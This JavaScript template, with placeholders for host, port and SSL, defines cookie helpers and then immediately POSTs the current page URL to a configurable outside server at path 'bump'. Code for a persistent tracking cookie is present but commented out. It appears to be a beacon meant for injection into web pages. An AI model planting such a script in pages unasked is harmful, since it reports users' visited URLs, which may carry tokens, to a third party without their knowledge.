function getRandom(length) {
    i = 0;
    result = '';
    while (i < length) {
        result += Math.floor(Math.random() * 16).toString(16);
        i++;
    }
    return result;
}

function getCookie(name) {
  var matches = document.cookie.match(new RegExp(
    "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
  ));
  return matches ? decodeURIComponent(matches[1]) : undefined;
}

function setCookie(name, value) {
    date = new Date;
    date.setDate(date.getDate() + 365);
    expires = date.toUTCString();
    document.cookie = name + "=" + value + ";" + "expires=" + expires;
}

(function () {
    host = "{{host}}";
    port = "{{port}}";
    path = "bump";

    // if(!(sid = getCookie("SID"))){
    //     sid = getRandom(16);
    //     setCookie("SID", sid);
    // }


    var xhr = new XMLHttpRequest();
    url = "http{{ssl}}://" + host + ":" + port + "/" + path;
    xhr.open("POST", url, true);
    xhr.onreadystatechange = function () {
        // console.log(xhr.status);
    }
    xhr.send(document.location);
})();
